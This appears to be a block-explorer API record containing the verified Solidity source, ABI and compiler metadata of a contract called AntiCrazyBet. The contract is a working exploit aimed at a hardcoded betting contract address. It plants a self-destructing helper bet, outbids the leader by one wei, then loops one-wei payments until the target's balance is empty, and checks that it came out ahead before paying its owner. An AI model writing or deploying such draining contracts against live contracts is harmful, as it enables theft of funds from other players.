{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.5.0;\r\n\r\ninterface TargetInterface {\r\n    function getPlayersNum() external view returns (uint256);\r\n    function getLeader() external view returns (address payable, uint256);\r\n}\r\n\r\ncontract PseudoBet {\r\n    constructor(address payable targetAddress) public payable {\r\n        (bool ignore,) = targetAddress.call.value(msg.value)(\"\");\r\n        ignore;\r\n        selfdestruct(msg.sender);\r\n    }\r\n}\r\n\r\ncontract AntiCrazyBet {\r\n    \r\n    address payable private constant targetAddress = 0xE0C0c6bE9a09c9df23522db2b69D39Ccb3c3DC98;\r\n    address payable private owner = msg.sender;\r\n    \r\n    modifier onlyOwner {\r\n        require(msg.sender == owner);\r\n        _;\r\n    }\r\n    \r\n    constructor() public payable {\r\n    }\r\n    \r\n    function ping(bool _keepBalance) public payable onlyOwner {\r\n        uint256 ourBalanceInitial = address(this).balance;\r\n\r\n        TargetInterface target = TargetInterface(targetAddress);\r\n        \r\n        uint256 playersNum = target.getPlayersNum();\r\n        require(playersNum > 0);\r\n        \r\n        if (playersNum == 1) {\r\n            (new PseudoBet).value(1 wei)(targetAddress);\r\n        }\r\n        \r\n        (, uint256 leaderBet) = target.getLeader();\r\n        uint256 bet = leaderBet + 1;\r\n        \r\n        (bool success,) = targetAddress.call.value(bet)(\"\");\r\n        require(success);\r\n        \r\n        for (uint256 ourBetIndex = 0; ourBetIndex < 100; ourBetIndex++) {\r\n            if (targetAddress.balance == 0) {\r\n                break;\r\n            }\r\n\r\n            (bool anotherSuccess,) = targetAddress.call.value(1 wei)(\"\");\r\n            require(anotherSuccess);\r\n        }\r\n        \r\n        require(address(this).balance > ourBalanceInitial);\r\n        \r\n        if (!_keepBalance) {\r\n            owner.transfer(address(this).balance);\r\n        }\r\n    }\r\n    \r\n    function withdraw() public onlyOwner {\r\n        owner.transfer(address(this).balance);\r\n    }    \r\n    \r\n    function kill() public onlyOwner {\r\n        selfdestruct(owner);\r\n    }    \r\n    \r\n    function () external payable {\r\n    }\r\n    \r\n}","ABI":"[{\"constant\":false,\"inputs\":[{\"name\":\"_keepBalance\",\"type\":\"bool\"}],\"name\":\"ping\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"kill\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]","ContractName":"AntiCrazyBet","CompilerVersion":"v0.5.4+commit.9549d8ff","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://a0d7f4dafd86e013c890f227b3037e55393fafbde60f994e5c0136aac4b19d5b"}]}